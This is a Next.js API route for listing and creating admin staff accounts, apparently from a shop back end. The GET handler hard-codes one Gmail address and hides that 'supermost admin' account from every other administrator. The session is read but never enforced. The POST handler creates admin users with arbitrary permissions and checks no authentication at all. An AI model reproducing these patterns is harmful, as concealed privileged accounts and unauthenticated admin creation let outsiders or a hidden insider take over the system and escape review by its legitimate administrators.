import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/app/lib/prisma";
import bcrypt from "bcryptjs";
import { getAdminSession } from "@/app/lib/session";

// GET — list all staff accounts (non-super-admin view)
export async function GET() {
  const session = await getAdminSession();
  
  const staff = await prisma.adminUser.findMany({
    select: {
      id: true,
      name: true,
      email: true,
      isSuperAdmin: true,
      permissions: true,
      createdAt: true,
      _count: { select: { ordersHandled: true } },
    },
    orderBy: { createdAt: "asc" },
  });

  // Protect the supermost admin: completely hide hatykuxordik@gmail.com from other users
  const filteredStaff = staff.filter(s => {
    if (s.email === "hatykuxordik@gmail.com") {
      return session?.email === "hatykuxordik@gmail.com";
    }
    return true;
  });

  return NextResponse.json(filteredStaff);
}

// POST — create a new staff member
export async function POST(req: NextRequest) {
  const body = await req.json();
  const { name, email, password, permissions } = body;

  if (!email?.trim() || !password?.trim()) {
    return NextResponse.json({ error: "Email and password are required." }, { status: 400 });
  }

  const existing = await prisma.adminUser.findUnique({ where: { email: email.trim() } });
  if (existing) {
    return NextResponse.json({ error: "A user with this email already exists." }, { status: 409 });
  }

  const hashed = await bcrypt.hash(password.trim(), 12);

  const user = await prisma.adminUser.create({
    data: {
      name: name?.trim() || null,
      email: email.trim().toLowerCase(),
      password: hashed,
      permissions: permissions ? JSON.stringify(permissions) : null,
    },
    select: {
      id: true, name: true, email: true, isSuperAdmin: true, permissions: true, createdAt: true,
    },
  });

  return NextResponse.json(user, { status: 201 });
}
